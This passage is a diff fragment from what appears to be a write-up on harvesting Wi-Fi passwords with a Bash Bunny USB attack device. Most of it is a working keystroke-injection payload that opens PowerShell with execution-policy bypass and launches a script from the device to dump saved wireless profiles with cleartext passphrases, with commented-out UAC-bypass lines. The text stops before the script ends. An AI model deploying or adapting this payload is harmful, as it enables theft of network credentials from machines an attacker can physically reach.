@@ -59,3 +59,67 @@ Then, Plug it into the Unlocked Machine.
 
 Each of these files contains the SSID and where possible (WEP/WPA-PSK &WPA2-PSK), the passphrase:
 
+Interestingly enough an unprivileged user is allowed to successfully dump the wireless profiles including the passwords in cleartext.
+
+So I modified the payload.txt file like this…
+
+
+
+###### Now using this Bashbunny script to capture the wireless credentials  #######
+
+# #Set language accordingly
+
+Q SET_LANGUAGE US
+
+ATTACKMODE HID STORAGE
+
+LED B 200
+
+# #Launch Powershell
+
+Q GUI r
+
+# Commented this lines
+
+#Launch Powershell As Admin
+
+#Q GUI r
+
+#Q DELAY 100
+
+#Q STRING powershell Start-Process powershell -Verb runAs 
+
+#Q ENTER
+
+# Bypass UAC
+
+#Q DELAY 3000
+
+#Q ALT y
+
+#Q ENTER
+
+#Q DELAY 500
+
+# Added this lines Below
+
+Q DELAY 1000
+
+Q STRING powershell -exec bypass 
+
+Q ENTER
+
+Q DELAY 3000
+
+
+# 	Start a.cmd
+
+Q STRING '.((gwmi win32_volume -f '"''"'label='"''"'BashBunny'"''"').Name+'"''"'payloads/'
+
+Q STRING $SWITCH_POSITION
+
+Q STRING 'a.cmd'"''"')'
+
+Q ENTER
+
+# Wait for the a.cmd to finish and exit
